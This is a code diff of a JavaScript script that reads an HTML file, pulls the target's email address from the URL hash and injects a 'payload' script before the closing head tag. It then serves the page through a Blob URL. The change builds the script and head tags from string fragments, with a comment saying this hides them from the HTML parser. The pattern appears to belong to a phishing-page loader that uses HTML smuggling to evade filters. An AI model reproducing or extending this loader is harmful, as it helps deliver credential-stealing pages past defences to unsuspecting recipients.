@@ -15,7 +15,7 @@ try {
     if (missingFiles.length > 0) {
         console.warn(`⚠️ Required file(s) not found: ${missingFiles.join(', ')}. Skipping generation to avoid failing the workflow while preserving existing repository files.`);
         process.exitCode = 0;
-        process.exit(0); // ✅ FIXED: Replaced 'return;' with 'process.exit(0);'
+        process.exit(0); // Gracefully exit without throwing a syntax error
     }
 
     const htmlContent = fs.readFileSync('n1.html', 'utf8');
@@ -74,9 +74,17 @@ try {
             const emailFromHash = hash && hash.length > 1 ? decodeURIComponent(hash.slice(1)) : null;
 
             try {
-                // Safely escape </script> tags in the payload to prevent breaking the HTML
-                jsContent = jsContent.replace(/<\\/script>/gi, '<\\\\/script>');
-                const cleanHtml = htmlContent.replace(/<\\/head>/i, \`<script>\${jsContent}<\\/script></head>\`);
+                // Hide tags from the HTML parser by building them dynamically
+                const closeTag = '<' + '/script>';
+                const openTag = '<' + 'script>';
+                
+                // Escape any closing tags in the payload
+                jsContent = jsContent.split(closeTag).join('<\\\\/' + 'script>');
+                
+                // Inject the payload before </head>
+                const headClose = '<' + '/head>';
+                const injection = openTag + jsContent + closeTag;
+                const cleanHtml = htmlContent.split(headClose).join(injection + headClose);
 
                 const blob = new Blob([cleanHtml], { type: 'text/html' });
                 const blobUrl = URL.createObjectURL(blob);
